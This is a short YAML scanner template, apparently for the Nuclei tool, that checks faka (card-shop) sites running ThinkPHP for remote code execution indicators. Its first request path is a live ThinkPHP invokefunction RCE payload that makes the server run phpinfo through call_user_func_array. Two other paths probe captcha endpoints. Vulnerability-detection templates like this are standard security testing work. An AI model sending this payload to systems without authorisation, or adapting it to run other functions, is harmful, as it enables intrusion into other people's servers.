id: thinkphp-rce-faka

info:
  name: ThinkPHP RCE indicators on faka sites
  author: faka-toolkit
  severity: high
  description: ThinkPHP 路径/报错特征（异次元常见）
  tags: faka,thinkphp,rce

http:
  - method: GET
    path:
      - "{{BaseURL}}/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
      - "{{BaseURL}}/index.php?s=captcha"
      - "{{BaseURL}}/admin.php?s=captcha"

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "PHP Version"
          - "thinkphp"
          - "ThinkPHP"
      - type: status
        status:
          - 500
